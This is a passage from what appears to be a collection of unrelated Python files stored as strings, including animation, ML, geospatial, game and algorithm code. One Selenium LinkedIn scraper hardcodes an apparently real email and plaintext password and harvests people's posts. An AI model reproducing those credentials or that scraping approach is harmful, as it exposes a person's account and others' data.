#\n\nlmfn_div_2_args = lambda arg1, arg2 : arg1 / arg2\nlmfn_div_3_args = lambda arg1, arg2, arg3 : arg1 / arg2 / arg3\nlmfn_div_4_args = lambda arg1, arg2, arg",
    "from manimlib import *\nfrom collections import namedtuple\n\nclass Coordinate(namedtuple('Coordinate', ('x', 'y', 'z'))):\n\t__slots__ = ()  # no idea what this does\n\nclass UnitTrianglePoints(namedtuple('UnitTrianglePoints', ('bl', 'br', 'tr'))):\n\t__slots__ = ()  # no idea what this does\n\nclass UnitTriangleEdges(namedtuple('UnitTriangleEdges', ('b', 'r', 'tl'))):\n\t__slots__ = ()  # no idea what this does\n\nclass TrigTriangle(Scene):\n\tdef construct(self):\n\t\t# triangle value trackers\n\t\tangle = ValueTracker(PI/6)\n\t\thypotenuse = ValueTracker(3.7)\n\t\tx = ValueTracker(0)\n\t\ty = ValueTracker(0)\n\n\t\tdef normalize_angle(angle: float):\n\t\t\treturn (angle + TAU * math.ceil(angle / TAU)) % TAU\n\n\t\t# returns normalize angle value tracker\n\t\tdef get_normalized_angle():\n\t\t\treturn normalize_angle(angle.get_value())\n\t\t\n\n\t\tdef get_points():\n\t\t\tbl = x.get_value(), y.get_value(), 0\n\t\t\tbr = x.get_value() + math.cos(angle.get_value()) * hypotenuse.get_value(), y.get_value(), 0\n\t\t\ttr = (\n\t\t\t\tx.get_value() + math.cos(angle.get_value()) * hypotenuse.get_value(),\n\t\t\t\ty.get_value() + math.sin(angle.get_value()) * hypotenuse.get_value(),\n\t\t\t\t0,\n\t\t\t)\n\t\t\treturn UnitTrianglePoints(Coordinate(*bl), Coordinate(*br), Coordinate(*tr))\n\t\t\n\t\tdef get_dots():\n\t\t\treturn UnitTrianglePoints(*(Dot(i) for i in get_points()))\n\t\t\n\t\tdef get_lines():\n\t\t\tpoints = get_points()\n\t\t\tb = Line(points[0], points[1])\n\t\t\tr = Line(points[1], points[2])\n\t\t\ttl = Line(points[0], points[2])\n\t\t\treturn UnitTriangleEdges(b, r, tl)\n\n\t\talways_redraw_lines = [\n\t\t\talways_redraw(lambda: get_lines().b.set_color(BLUE)),\n\t\t\talways_redraw(lambda: get_lines().r.set_color(RED)),\n\t\t\talways_redraw(lambda: get_lines().tl).set_color(GREY),\n\t\t]\n\n\t\tdef align_mobject_center(mobject: Mobject, point: Iterable[float], rotation: float, normal_angle: float, distance: float):\n\t\t\tpos = (\n\t\t\t\tpoint[0] + math.cos(normal_angle) * distance,\n\t\t\t\tpoint[1] + math.sin(normal_angle) * distance,\n\t\t\t\t0,\n\t\t\t)\n\t\t\treturn mobject.rotate(rotation).move_to(pos)\n\t\t\n\t\tdef align_mobject_corner(mobject: Mobject, point: Iterable[float], rotation: float, normal_angle: float, distance: float):\n\t\t\tpos = (\n\t\t\t\tpoint[0] + math.cos(normal_angle) * distance,\n\t\t\t\tpoint[1] + math.sin(normal_angle) * distance,\n\t\t\t\t0,\n\t\t\t)\n\t\t\tbounding_box_width, bounding_box_height = mobject.get_width(), mobject.get_height()\n\t\t\tnormal_angle = normalize_angle(normal_angle)\n\t\t\tif normal_angle < PI/2:\n\t\t\t\tnormal_angle = PI/4\n\t\t\t\tshift = bounding_box_width / 2, bounding_box_height / 2, 0\n\t\t\telif normal_angle < PI:\n\t\t\t\tnormal_angle = 3*PI/4\n\t\t\t\tshift = -bounding_box_width / 2, bounding_box_height / 2, 0\n\t\t\telif normal_angle < 3*PI/2:\n\t\t\t\tnormal_angle = 5*PI/4\n\t\t\t\tshift = -bounding_box_width / 2, -bounding_box_height / 2, 0\n\t\t\telse:\n\t\t\t\tnormal_angle = 7*PI/4\n\t\t\t\tshift = bounding_box_width / 2, -bounding_box_height / 2, 0\n\t\t\treturn mobject.rotate(rotation).move_to(pos).shift(shift)\n\t\t\n\t\tdef align_mobject_corner_interpolate(mobject: Mobject, point: Iterable[float], rotation: float, normal_angle: float, distance: float):\n\t\t\tpos = (\n\t\t\t\tpoint[0] + math.cos(normal_angle) * distance,\n\t\t\t\tpoint[1] + math.sin(normal_angle) * distance,\n\t\t\t\t0,\n\t\t\t)\n\t\t\tbounding_box_width, bounding_box_height = mobject.get_width(), mobject.get_height()\n\t\t\tnormal_angle = normalize_angle(normal_angle)\n\n\t\t\tdef get_shift_val(min_angle: float, max_angle: float, angle: float, max_shift: float):\n\t\t\t\treturn ((angle - min_angle) / (max_angle - min_angle) * 2 - 1) * max_shift\n\n\t\t\tif normal_angle < PI/4 or normal_angle > 7*PI/4:\n\t\t\t\tshift = bounding_box_width / 2, get_shift_val(0, PI/2, normalize_angle(normal_angle+PI/4), bounding_box_height / 2), 0\n\t\t\telif normal_angle < 3*PI/4:\n\t\t\t\tshift = get_shift_val(PI/4, 3*PI/4, normal_angle, -bounding_box_width / 2), bounding_box_height / 2, 0\n\t\t\telif normal_angle < 5*PI/4:\n\t\t\t\tshift = -bounding_box_width / 2, get_shift_val(3*PI/4, 5*PI/4, normal_angle, -bounding_box_height / 2), 0\n\t\t\telse:\n\t\t\t\tshift = get_shift_val(5*PI/4, 7*PI/4, normal_angle, bounding_box_width / 2), -bounding_box_height / 2, 0\n\t\t\treturn mobject.rotate(rotation).move_to(pos).shift(shift)\n\t\t\n\t\t# edge labels\n\t\tedge_label_distance = ValueTracker(0.2)\n\t\tedge_label_size = ValueTracker(6)\n\t\talways_redraw_labels = [\n\t\t\talways_redraw(lambda: align_mobject_center(Text(f'{round(abs(get_points().br.x - get_points().bl.x) / hypotenuse.get_value(), 2)}', font_size=round(edge_label_size.get_value()*hypotenuse.get_value())), get_lines().b.get_center(), 0, 3*PI/2 if math.sin(angle.get_value()) > 0 else PI/2, edge_label_distance.get_value()).set_color(BLUE)),\n\t\t\talways_redraw(lambda: align_mobject_center(Text(f'{round(abs(get_points().br.y - get_points().tr.y) / hypotenuse.get_value(), 2)}', font_size=round(edge_label_size.get_value()*hypotenuse.get_value())), get_lines().r.get_center(), 3*PI/2 if math.cos(angle.get_value()) > 0 else PI/2, 0 if math.cos(angle.get_value()) > 0 else PI, edge_label_distance.get_value()).set_color(RED)),\n\t\t\t# always_redraw(lambda: redraw_label_function(lambda: f'{round(math.dist",
    "import EnclaveSDK\n\n# Set the code to access the Enclave API inside the enclave as follows:\nconfiguration = EnclaveSDK.Configuration(\"https://localhost:5000\")\nsas_url = None \n\n# Uncomment the following lines to use the EnclaveAPI Sandbox, make sure to comment before uploading to EscrowAI\n# configuration.host = \"https://sandbox.dev.escrow.beekeeperai.com\"\n# sas_url = 'SAS-URL-WITH-READ-AND-LIST-PERMISSIONS' \n\napi_client = EnclaveSDK.ApiClient(configuration)\n\ndef main():\n    \"\"\"Main function demonstrating how to use EnclaveSDK\"\"\"\n    \n    #### \n    # 1. List available data files\n    ###\n    # Create an instance of Data API class and list files in blob storage\n    api_data_instance = EnclaveSDK.DataApi(api_client)\n    api_response = api_data_instance.api_v1_data_files_get(sas_url=sas_url)\n    \n    ###\n    # 2. Fetch data files\n    ###\n    for file in api_response.files:\n      file_content = api_data_instance.api_v1_data_file_get(file.name, sas_url=sas_url)\n      print(file.name)\n\n    ### \n    # 3. Post a log message\n    ###\n    api_log_instance = EnclaveSDK.LogApi(api_client)\n    api_response = api_log_instance.api_v1_log_post(EnclaveSDK.LogData(message=\"Log message from algo-template.py\"))\n\n    ###\n    # 4. Validate a report with in-line schema\n    ###\n    api_report_instance = EnclaveSDK.ReportApi(api_client)\n    report = {\"json_data\": {\"report\": \"Performance Report\"},\n              \"json_schema\": { \"report\": { \"type\": \"string\", \"allowed\": [ \"Performance Report\" ] } },\n              \"name\": \"EscrowAI Algorithm Package\", \n              \"status\": \"Completed\"}\n    api_response = api_report_instance.api_v1_validate_post(EnclaveSDK.Report.from_dict(report))\n\n    ###\n    # 5. Post report\n    ###\n    # Create an instance of Report API class\n    api_report_instance = EnclaveSDK.ReportApi(api_client)\n    report = {\"json_data\": {\"report\": \"Performance Report\"}, \n              \"name\": \"EscrowAI Algorithm Package\", \n              \"status\": \"Completed\"}\n    api_response = api_report_instance.api_v1_report_post(EnclaveSDK.Report.from_dict(report))\n\nif __name__ == \"__main__\":\n    main()",
    "class Solution:\n    def palindromePairs(self, words: list[str]) -> list[list[int]]:\n        # reverse_dict = {word[::-1]:word_i for word_i, word in enumerate(words)}\n        reverse_idx = {}\n        reverse_words = {}\n        for word_i, word in enumerate(words):\n            reversed_word = word[::-1]\n            reverse_idx[reversed_word] = word_i\n            reverse_words[word_i] = reversed_word\n\n        def get_reversed_substring(word_i, i, j):\n            i = -len(reverse_words[word_i]) if i==0 and j!=0 else i\n            return reverse_words[word_i][-j:-i]\n\n        ret = []\n\n        def check_substrings(substring, substring_idx, if_start=True):\n            if substring in reverse_idx and reverse_idx[substring] != substring_idx:\n                if not if_start:\n                    ret.append([substring_idx, reverse_idx[substring]])\n                else:\n                    ret.append([reverse_idx[substring], substring_idx])\n\n        for word_j, word in enumerate(words):\n\n            # midpoint at the start of word_j\n            midpoint = 0\n            left_half = \"\" # reversed\n            try:\n                while True:\n                    left_half = get_reversed_substring(word_j, 0, midpoint)\n                    right_half = word[midpoint:midpoint*2]\n                    if left_half == right_half:\n                        check_substrings(word[midpoint*2:], word_j)\n                    \n                    right_half = word[midpoint+1:midpoint*2+1]\n                    if left_half == right_half:\n                        check_substrings(word[midpoint*2+1:], word_j)\n                    \n                    midpoint += 1\n                    assert midpoint <= len(word)//2\n            except:\n                pass\n            # midpoint at the end of word_j\n            step_count = 0\n            try:\n                while True:\n                    \n                    left_half = word[-step_count*2:-step_count]\n                    right_half = get_reversed_substring(word_j, len(word)-step_count, len(word))\n                    if step_count != 0 and left_half == right_half:\n                        check_substrings(word[:len(word)-step_count*2], word_j, if_start=False)\n                    left_half = word[-step_count*2-1:-step_count-1]\n                    if left_half == right_half:\n                        check_substrings(word[:-step_count*2-1], word_j, if_start=False)\n                    step_count += 1\n                    assert step_count <= len(word)//2\n            except:\n                pass\n        return ret\n\nif __name__ == \"__main__\":\n    testcase1 = [\"abcd\",\"dcba\",\"lls\",\"s\",\"sssll\"]\n    sol = Solution()\n    print(sol.palindromePairs(testcase1))\n",
    "import PIL\nimport streamlit as st \nfrom tensorflow.keras.preprocessing import image\nimport numpy as np\n\ndef get_model_output(model , processor) : \n\n    image = PIL.Image.open('Uploaded_file.jpg')\n\n    inputs = processor(images = image , return_tensors = 'pt')\n    outputs = model(**inputs)\n    results = processor.post_process_object_detection(\n        outputs , \n        target_sizes = torch.tensor([image.size[: : -1]]) , \n        threshold = 0.9)[0]\n\n    if len(results['labels']) == 0 : return False \n    for label in results['labels'] : \n\n        if model.config.id2label[label.item()] in [\n            'cow' , 'buffalo' \n        ] : return True \n\n    return False\n\n\ndef preprocess_image(image_path) : \n\n    img = image.load_img(image_path , target_size = (224 , 224)) \n    \n    img_array = image.img_to_array(img) \n    img_array = np.expand_dims(img_array , axis = 0) \n    \n    return img_array\n\ndef get_label(classifier_model , bb_model , processor) : \n\n    c_label = None\n    counter = 0\n    cattles = True\n\n    if get_model_output(bb_model , processor) : \n\n\n        preprocessed_image = preprocess_image('Uploaded_file.jpg')\n        predictions = classifier_model.predict(preprocessed_image)\n\n        if predictions[0][0] >= 0.25 : return 0\n        return 1\n    return 2\n",
    "import multiprocessing\r\nfrom shapely.geometry import MultiPolygon\r\nimport pandas as pd\r\nimport geopandas as gpd\r\nimport json\r\nimport ee\r\nimport io\r\nfrom google.cloud import storage\r\n\r\njson_credentials_path = './data-enginerring-zoomcamp-b8719aa4a43e.json'\r\n\r\n# Define a helper function to put the GeoDataFrame in the right format for constructing an EE object\r\ndef shp_to_ee_fmt(geodf):\r\n    combine_poly = geodf.dissolve('landuse')\r\n    data = json.loads(combine_poly.to_json())\r\n    return data['features'][0]['geometry']['coordinates']\r\n\r\ndef shapely_to_ee_feature(geom, tolerance=0.01):\r\n    \"\"\"Converts Shapely geometry to Earth Engine Feature.\"\"\"\r\n    # Simplify the geometry if it's a Polygon or MultiPolygon\r\n    if geom.geom_type == 'Polygon':\r\n        geom = geom.simplify(tolerance)\r\n    elif geom.geom_type == 'MultiPolygon':\r\n        simplified_geoms = [sub_geom.simplify(tolerance) for sub_geom in geom.geoms]\r\n        geom = MultiPolygon(simplified_geoms)\r\n    else:\r\n        raise ValueError(\"Unsupported geometry type\")\r\n\r\n    # Convert the simplified geometry to EE Feature\r\n    if geom.geom_type == 'MultiPolygon':\r\n        coords = [list(sub_geom.exterior.coords) for sub_geom in geom.geoms]\r\n    else:\r\n        coords = list(geom.exterior.coords)\r\n    return ee.Feature(ee.Geometry.Polygon(coords))\r\n\r\ndef get_ee_features(gdf):\r\n    \"\"\"Converts GeoDataFrame geometries to Earth Engine Features.\"\"\"\r\n    return [shapely_to_ee_feature(row.geometry) for idx, row in gdf.iterrows()]\r\n\r\n# Function to process each subset and compute mean NDVI\r\ndef zonal_stats_mean(image, scale, subset):\r\n    features = ee.FeatureCollection(get_ee_features(subset))  # Convert to EE Features\r\n    zone_stats = image.reduceRegions(\r\n        collection=features, reducer=ee.Reducer.mean(),\r\n          scale=scale ,crs='EPSG:4326'\r\n    ).getInfo()\r\n    zone_stats_gdf = gpd.GeoDataFrame.from_features(zone_stats['features'], crs='EPSG:4326')\r\n    return zone_stats_gdf\r\n\r\ndef process_zonal_stats_chunks(image, scale, farmland_gdf, chunk_size):    \r\n    # Split farmland boundaries into subsets\r\n    subsets = [farmland_gdf.iloc[i:i+chunk_size].copy() for i in range(0, len(farmland_gdf), chunk_size)]\r\n    \r\n    # Initialize a multiprocessing pool\r\n    pool = multiprocessing.Pool()\r\n    \r\n    # Process subsets in parallel and collect results\r\n    zone_stats_gdfs = pool.starmap(zonal_stats_mean, [(image, scale, subset) for subset in subsets])\r\n    \r\n    # Close the multiprocessing pool\r\n    pool.close()\r\n    pool.join()\r\n    \r\n    # Concatenate all GeoDataFrames in the list into a single GeoDataFrame\r\n    final_zone_stats_gdf = pd.concat(zone_stats_gdfs, ignore_index=True)\r\n    \r\n    return final_zone_stats_gdf\r\n\r\ndef upload_dataframe_to_gcs(dataframe: pd.DataFrame, bucket_name: str, destination_blob_path: str,json_credentials_path):\r\n    storage_client = storage.Client.from_service_account_json(json_credentials_path)\r\n    bucket = storage_client.get_bucket(bucket_name)\r\n    blob = bucket.blob(destination_blob_path)\r\n\r\n    # Convert DataFrame to CSV bytes\r\n    csv_bytes = dataframe.to_csv(index=False).encode('utf-8')  # Consider compression if needed\r\n\r\n    # Upload DataFrame bytes to GCS\r\n    blob.upload_from_string(csv_bytes)\r\n\r\n    print(f'DataFrame uploaded to GCS: gs://{bucket_name}/{destination_blob_path}')\r\n\r\ndef download_geodataframe_from_gcs(bucket_name, file_path,json_credentials_path):\r\n    client = storage.Client.from_service_account_json(json_credentials_path)\r\n    bucket = client.bucket(bucket_name)\r\n    blob = bucket.blob(file_path)\r\n    data = blob.download_as_string()\r\n    gdf = gpd.read_file(io.BytesIO(data))\r\n    return gdf\r\n\r\n\r\n\r\n\r\n",
    "# import os\n# from selenium.webdriver.common.by import By\n# from selenium.webdriver.support.ui import WebDriverWait\n# from selenium.webdriver.support import expected_conditions as EC\n# from linkedin_scraper import Person, actions\n# from selenium import webdriver\n\n# os.environ['CHROMEDRIVER'] = '/Users/alikbangash/Downloads/chrome-mac-x64'\n\n# driver = webdriver.Chrome()\n\n# email = \"aaybangash@gmail.com\"\n# password = \"Mercedes@4557287\"\n# actions.login(driver, email, password) # if email and password isnt given, it'll prompt in terminal\n\n# # Add an explicit wait here\n# wait = WebDriverWait(driver, 10)\n# element = wait.until(EC.presence_of_element_located((By.ID, 'some-id')))\n\n# person = Person(\"https://www.linkedin.com/in/ali-sarosh-bangash-0413541b9/\", driver=driver)\n\nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.service import Service\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.common.keys import Keys\nfrom selenium.webdriver.chrome.options import Options\nfrom selenium.webdriver.common.action_chains import ActionChains\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom bs4 import BeautifulSoup as bs\nimport re as re\nimport time\nimport pandas as pd\n\nPATH = \"/Users/alikbangash/Downloads/chromedriver-mac-x64/chromedriver\"\nUSERNAME = \"aaybangash@gmail.com\"\nPASSWORD = \"Mercedes@4557287\"\n\n# Set up Chrome options\nchrome_options = Options()\nchrome_options.add_argument(\"--headless\")  # Ensure GUI is off\nchrome_options.add_argument(\"--no-sandbox\")\nchrome_options.add_argument(\"--disable-dev-shm-usage\")\n\n# Set path to chromedriver as per your configuration\nwebdriver_service = Service(PATH)\n\n# Choose Chrome Browser\ndriver = webdriver.Chrome(service=webdriver_service, options=chrome_options)\n\ndriver.get(\"https://www.linkedin.com/uas/login\")\n\n# Wait for the username field to be present\nWebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, \"username\")))\n\nemail = driver.find_element(By.ID, \"username\")\nemail.send_keys(USERNAME)\n\n# Wait for the password field to be present\nWebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, \"password\")))\n\npassword = driver.find_element(By.ID, \"password\")\npassword.send_keys(PASSWORD)\n\npassword.send_keys(Keys.RETURN)\n\npost_links = []\npost_texts = []\npost_names = []\n\ndef Scrape_func(a,b,c):\n    name = a[28:-1]\n    page = a\n    time.sleep(10)\n\n    driver.get(page + 'detail/recent-activity/shares/')  \n    start=time.time()\n    lastHeight = driver.execute_script(\"return document.body.scrollHeight\")\n    while True:\n        driver.execute_script(\"window.scrollTo(0, document.body.scrollHeight);\")\n        time.sleep(5)\n        newHeight = driver.execute_script(\"return document.body.scrollHeight\")\n        if newHeight == lastHeight:\n            break\n        lastHeight = newHeight\n        end=time.time()\n        if round(end-start)>25:\n            break\n\n    company_page = driver.page_source   \n\n    linkedin_soup = bs(company_page.encode(\"utf-8\"), \"lxml\")\n    linkedin_soup.prettify()\n    containers = linkedin_soup.findAll(\"div\",{\"class\":\"occludable-update ember-view\"})\n    print(\"Fetching data from account: \"+ name)\n    iterations = 0\n    nos = int(input(\"Enter number of posts: \"))\n    for container in containers:\n\n        try:\n            text_box = container.find(\"div\",{\"class\":\"feed-shared-update-v2__description-wrapper ember-view\"})\n            text = text_box.find(\"span\",{\"dir\":\"ltr\"})\n            b.append(text.text.strip())\n            c.append(name)\n            iterations += 1\n            print(iterations)\n            \n            if(iterations==nos):\n                break\n\n        except:\n            pass \n\nn = int(input(\"Enter the number of entries: \"))\nfor i in range(n):\n    post_links.append(input(\"Enter the link: \"))\nfor j in range(n):\n    Scrape_func(post_links[j],post_texts,post_names)\n\n        \ndriver.quit()\n\ndata = {\n    \"Name\": post_names,\n    \"Content\": post_texts,\n} \ndf = pd.DataFrame(data)\ndf.to_csv(\"gtesting2.csv\", encoding='utf-8', index=False)\nwriter = pd.ExcelWriter(\"gtesting2.xlsx\", engine='xlsxwriter')\ndf.to_excel(writer, index =False)\nwriter.close()\n\ndf.to_csv(\"test1.csv\", encoding='utf-8', index=False)\n\n",
    "import tensorflow as tf\nfrom tensorflow.keras.callbacks import EarlyStopping, ModelCheckpoint\n\nfrom model import create_model  # Import your model architecture\nfrom data_loader import train_generator, validation_generator  # Import data generators\n\n# Hyperparameters (adjust based on your dataset and hardware)\nepochs = 3\nbatch_size = 16\nlearning_rate = 0.001\nimages, targets = next(train_generator)\nprint(f\"Image shape: {images.shape}\")\nprint(f\"Target shape: {targets.shape}\")\n# Define optimizer (Adam is a common choice)\noptimizer = tf.keras.optimizers.Adam(learning_rate=learning_rate)\n\n# Assuming you know the image dimensions and number of classes from your dataset\nimage_height = 600  # Adjust based on your data\nimage_width = 600  # Adjust based on your data\nnum_classes = 2      # Adjust based on your data (e.g., 2 for binary)\n\n# Create the model instance with required arguments\nmodel = create_model(image_height, image_width, num_classes)\n\n# Compile the model (categorical crossentropy for binary classification)\nmodel.compile(loss='binary_crossentropy', optimizer=optimizer, metrics=['accuracy'])\n\n# ... rest of your training script continues as before ...\n\n# Early stopping callback to prevent overfitting\nearly_stopping = EarlyStopping(monitor='val_loss', patience=3)\n\n# Model checkpoint callback to save the best model based on validation loss\nmodel_checkpoint = ModelCheckpoint(filepath='best_model.keras',  # Fixed filepath extension\n                                   monitor='val_loss',\n                                   save_best_only=True)\n\n# Train the model\nhistory = model.fit(train_generator,\n                    epochs=epochs,\n                    validation_data=validation_generator,\n                    callbacks=[early_stopping, model_checkpoint])\n\n\n# Optional: Print training history and save final model (code remains the same)\n\n",
    "true = True\nfalse = False\nnull = None\nserializedMaze = [\n  {\n    \"i\": 0,\n    \"j\": 0,\n    \"walls\": [\n      true,\n      false,\n      true,\n      true\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 1,\n    \"j\": 0,\n    \"walls\": [\n      true,\n      false,\n      false,\n      true\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 2,\n    \"j\": 0,\n    \"walls\": [\n      true,\n      false,\n      true,\n      false\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 3,\n    \"j\": 0,\n    \"walls\": [\n      true,\n      false,\n      true,\n      false\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 4,\n    \"j\": 0,\n    \"walls\": [\n      true,\n      false,\n      false,\n      false\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 5,\n    \"j\": 0,\n    \"walls\": [\n      true,\n      false,\n      true,\n      false\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 6,\n    \"j\": 0,\n    \"walls\": [\n      true,\n      false,\n      true,\n      false\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 7,\n    \"j\": 0,\n    \"walls\": [\n      true,\n      true,\n      false,\n      false\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 8,\n    \"j\": 0,\n    \"walls\": [\n      true,\n      false,\n      false,\n      true\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 9,\n    \"j\": 0,\n    \"walls\": [\n      true,\n      true,\n      false,\n      false\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 10,\n    \"j\": 0,\n    \"walls\": [\n      true,\n      false,\n      false,\n      true\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 11,\n    \"j\": 0,\n    \"walls\": [\n      true,\n      false,\n      true,\n      false\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 12,\n    \"j\": 0,\n    \"walls\": [\n      true,\n      false,\n      true,\n      false\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 13,\n    \"j\": 0,\n    \"walls\": [\n      true,\n      false,\n      true,\n      false\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 14,\n    \"j\": 0,\n    \"walls\": [\n      true,\n      false,\n      true,\n      false\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 15,\n    \"j\": 0,\n    \"walls\": [\n      true,\n      true,\n      false,\n      false\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 0,\n    \"j\": 1,\n    \"walls\": [\n      false,\n      true,\n      false,\n      true\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 1,\n    \"j\": 1,\n    \"walls\": [\n      false,\n      false,\n      true,\n      true\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 2,\n    \"j\": 1,\n    \"walls\": [\n      true,\n      false,\n      true,\n      false\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 3,\n    \"j\": 1,\n    \"walls\": [\n      true,\n      true,\n      true,\n      false\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 4,\n    \"j\": 1,\n    \"walls\": [\n      false,\n      true,\n      false,\n      true\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 5,\n    \"j\": 1,\n    \"walls\": [\n      true,\n      false,\n      false,\n      true\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 6,\n    \"j\": 1,\n    \"walls\": [\n      true,\n      true,\n      false,\n      false\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 7,\n    \"j\": 1,\n    \"walls\": [\n      false,\n      true,\n      false,\n      true\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 8,\n    \"j\": 1,\n    \"walls\": [\n      false,\n      true,\n      false,\n      true\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 9,\n    \"j\": 1,\n    \"walls\": [\n      false,\n      true,\n      false,\n      true\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n    \"robotDirection\": null\n  },\n  {\n    \"i\": 10,\n    \"j\": 1,\n    \"walls\": [\n      false,\n      true,\n      false,\n      true\n    ],\n    \"isRobotHere\": false,\n    \"robotVisited\": false,\n ",
    "import pygame,random\nfrom sys import exit\npygame.display.init()\npygame.font.init()\npygame.display.set_caption('Snake Game')\nhighscore =0\nScreen=[680,680] \nnew = True\nfont = pygame.font.SysFont(' Monospace',70)\nfont2 = pygame.font.SysFont(' Mono',30)\nclock = pygame.time.Clock()             \nscreen = pygame.display.set_mode((Screen[0],Screen[1]+100))\nfont1 = pygame.font.SysFont('Comic Sans',43)\ndef gameover():\n    time =0\n    while True:\n        key = pygame.key.get_pressed()\n        if time > 500:\n            text1 = font1.render('PRESS SPACE TO PLAY AGAIN',1,(0,0,0))\n            screen.blit(text1,(25,Screen[1]//2-100))\n            if key[pygame.K_SPACE]:\n                Game_Over = False\n                return Game_Over\n        for event in pygame.event.get():\n                if event.type == pygame.QUIT:\n                    exit()\n        text = font.render('GAME  OVER',1,(0,0,0))\n        screen.blit(text,(Screen[0]//2-200,Screen[1]//2-200))\n        clock.tick(60)\n        time+=clock.tick(60)\n        pygame.display.update()\ndef Score():\n    score_text = font2.render(f'Score:{score}',1,(0,0,0))\n    \n    highscore_text = font2.render(f'HScore:{highscore}',1,(0,0,0))\n    screen.blit(highscore_text,(350,690))\n    screen.blit(score_text,(0,690))\ndef SetUP():\n    global Game_Over,new,direction,snake,snake_pos,snake_quantaty,t_p,vel,vel_y,snake_tail_list,Screen,tiles,VEL,t_p,apple_pos,border\n    VEL = 20\n    vel = VEL\n    vel_y = VEL\n    Game_Over = False\n    new = True\n    snake_pos = [(Screen[0]//VEL)*(VEL//2),(Screen[1]//VEL)*(VEL//2)]#[x,y]\n    snake_quantaty= -1\n    direction = 'N'\n    #U-UP,N-Neutral,D-DOWN,L-LEFT,R-RIGHT\n    apple_pos =[]\n    pygame.mouse.set_visible(False)\n    tiles=[]\n    snake_tail_list =[]\n    snake = pygame.Rect(snake_pos[0],snake_pos[1],VEL,VEL)\n    for h in range(Screen[0]//VEL):\n        for w in range(Screen[1]//VEL):\n                p =[VEL*(h),VEL*w]\n                p1 =[VEL*(h),VEL*w]\n                tiles.append(p)\n                apple_pos.append(p1)\n    t_p = []\n    border = pygame.Rect(0,740,Screen[0],100)\ndef main(): \n    global Game_Over,direction,snake,new,snake_quantaty,snake_pos,vel,vel_y,border,highscore,score\n    SetUP()\n    while True:\n        key = pygame.key.get_pressed()\n        FPS = 11\n        if Game_Over == False:\n            for event in pygame.event.get():\n                if event.type == pygame.QUIT:\n                    exit()\n            if key[pygame.K_UP]:\n                if not direction == 'D':\n                            direction = 'U'\n            if key[pygame.K_DOWN]:\n                if not direction == 'U':\n                            direction = 'D'\n            if key[pygame.K_RIGHT]:\n                if not direction == 'L':\n                            direction = 'R'\n            if key[pygame.K_LEFT]:\n                if not direction == 'R':\n                            direction = 'L'\n            for p in tiles[:]:\n                pygame.draw.rect(screen,('WHITE'),pygame.Rect(p[0],p[1],20,20),)\n                pygame.draw.rect(screen,(00,0,0),pygame.Rect(p[0],p[1],20,20),1)\n            border = pygame.Rect(0,680,Screen[0],100)\n            borderleft = pygame.Rect(Screen[0],0,VEL,Screen[1])\n            if direction=='U':\n                snake_pos[1]-=vel_y\n            if direction=='D':\n                snake_pos[1]+=vel_y\n            if direction=='R':\n                snake_pos[0]+=vel\n            if direction=='L':\n                snake_pos[0]-=vel\n            if snake_pos[0]<0 or snake_pos[0]>Screen[0]:\n                vel = 0\n                if snake_pos[0]<0:\n                    snake_pos[0]=0\n                if snake_pos[0]>Screen[0]:\n                    snake_pos[0]=Screen[0]-VEL\n                vel_y=0\n                t_p.clear()\n                Game_Over = True\n                \n            if 